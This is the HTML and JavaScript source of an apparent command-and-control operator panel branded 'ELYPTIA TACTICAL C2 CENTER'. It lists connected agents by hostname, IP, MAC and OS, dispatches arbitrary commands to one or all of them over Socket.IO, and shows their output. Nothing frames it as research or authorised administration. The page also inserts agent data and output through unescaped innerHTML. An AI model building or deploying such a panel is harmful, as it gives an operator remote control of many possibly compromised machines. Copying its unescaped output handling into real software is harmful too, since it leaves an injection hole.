<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELYPTIA | TACTICAL C2 CENTER</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.0/socket.io.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #050505;
            --accent: #00d4ff;
            --accent-dim: rgba(0, 212, 255, 0.1);
            --border: #1a1a1a;
            --text: #e0e0e0;
            --text-dim: #666;
            --danger: #ff3e3e;
            --success: #00ff88;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto Mono', monospace; }
        body { background: var(--bg); color: var(--text); overflow: hidden; height: 100vh; display: flex; flex-direction: column; }

        /* HEADER */
        header {
            height: 60px;
            border-bottom: 2px solid var(--accent);
            display: flex;
            align-items: center;
            padding: 0 30px;
            justify-content: space-between;
            background: rgba(10, 10, 10, 0.9);
            z-index: 100;
        }

        .title { font-weight: 700; font-size: 20px; letter-spacing: 2px; }
        .title span { color: var(--accent); }

        /* MAIN CONTENT */
        main { display: grid; grid-template-columns: 400px 1fr; flex-grow: 1; overflow: hidden; }

        /* SIDEBAR / AGENTS */
        .sidebar {
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            background: #080808;
        }

        .sidebar-header { padding: 20px; border-bottom: 1px solid var(--border); font-size: 14px; color: var(--text-dim); }

        .agent-list { flex-grow: 1; overflow-y: auto; }
        .agent-item {
            padding: 20px;
            border-bottom: 1px solid var(--border);
            cursor: pointer;
            transition: 0.2s;
        }
        .agent-item:hover { background: var(--accent-dim); }
        .agent-item.active { border-left: 4px solid var(--accent); background: rgba(0, 212, 255, 0.05); }

        .agent-name { font-weight: 700; margin-bottom: 5px; font-size: 14px; }
        .agent-meta { font-size: 11px; color: var(--text-dim); display: flex; flex-direction: column; gap: 3px; }
        .agent-status { font-size: 10px; padding: 2px 6px; border-radius: 3px; background: var(--success); color: black; display: inline-block; width: fit-content; margin-top: 5px; }

        /* INTERACTION CENTER */
        .console-container { display: flex; flex-direction: column; padding: 20px; gap: 20px; height: 100%; }

        .output-panel {
            flex-grow: 1;
            background: #000;
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 20px;
            overflow-y: auto;
            font-size: 13px;
        }

        .log-entry { margin-bottom: 15px; border-bottom: 1px solid #111; padding-bottom: 10px; }
        .log-header { color: var(--accent); font-size: 11px; margin-bottom: 5px; display: flex; justify-content: space-between; }
        .log-body { color: #ccc; white-space: pre-wrap; }

        /* INPUT */
        .input-bar {
            display: flex;
            background: #111;
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 10px;
            gap: 15px;
        }
        input { background: none; border: none; font-size: 15px; color: white; width: 100%; outline: none; }
        .target-label { color: var(--accent); font-weight: 700; white-space: nowrap; border-right: 1px solid var(--border); padding-right: 15px; }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: var(--accent); }
    </style>
</head>
<body>
    <header>
        <div class="title">ELYPTIA // CORE <span>TACTICAL_V2</span></div>
        <div id="connection-status" style="color: var(--success)">NETWORK_ESTABLISHED</div>
    </header>

    <main>
        <div class="sidebar">
            <div class="sidebar-header">FLEET_RESOURCES // <span id="agent-count">0</span> DETECTED</div>
            <div class="agent-list" id="agent-list">
                <!-- Agents dynamically loaded here -->
            </div>
        </div>

        <div class="console-container">
            <div class="output-panel" id="output">
                <div class="log-entry">
                    <div class="log-header">SYSTEM // INITIALIZED [127.0.0.1]</div>
                    <div class="log-body">Waiting for agent uplink... Ready for tactical orders.</div>
                </div>
            </div>

            <div class="input-bar">
                <div class="target-label" id="current-target">TARGET: ALL</div>
                <input type="text" id="cmdInput" placeholder="ENTER_COMMAND..." onkeypress="if(event.key === 'Enter') sendCommand()">
            </div>
        </div>
    </main>

    <script>
        const socket = io();
        let selectedAgent = 'all';

        socket.on('update_dashboard', (agents) => {
            const list = document.getElementById('agent-list');
            list.innerHTML = '';
            let count = 0;
            
            for(let id in agents) {
                const agent = agents[id];
                count++;
                const item = document.createElement('div');
                item.className = 'agent-item' + (selectedAgent === id ? ' active' : '');
                item.onclick = () => selectAgent(id);
                item.innerHTML = `
                    <div class="agent-name">${agent.hostname}</div>
                    <div class="agent-meta">
                        <span>IP: ${agent.ip}</span>
                        <span>MAC: ${agent.mac}</span>
                        <span>OS: ${agent.os}</span>
                    </div>
                    <div class="agent-status" style="background: ${agent.status === 'Online' ? '#00ff88' : '#ff3e3e'}">${agent.status}</div>
                `;
                list.appendChild(item);
            }
            document.getElementById('agent-count').innerText = count;
        });

        function selectAgent(id) {
            selectedAgent = id;
            document.getElementById('current-target').innerText = `TARGET: ${id.split('_')[0]}`;
            // Refresh list styles
            socket.emit('request_update'); // Force update list classes
        }

        function sendCommand() {
            const input = document.getElementById('cmdInput');
            const cmd = input.value;
            if(!cmd) return;

            socket.emit('dispatch_command', { target: selectedAgent, command: cmd });
            input.value = '';
        }

        socket.on('display_response', (data) => {
            const output = document.getElementById('output');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `
                <div class="log-header">RESPONSE // ${data.id} [${data.time}]</div>
                <div class="log-body">${data.output}</div>
            `;
            output.prepend(entry);
        });
    </script>
</body>
</html>
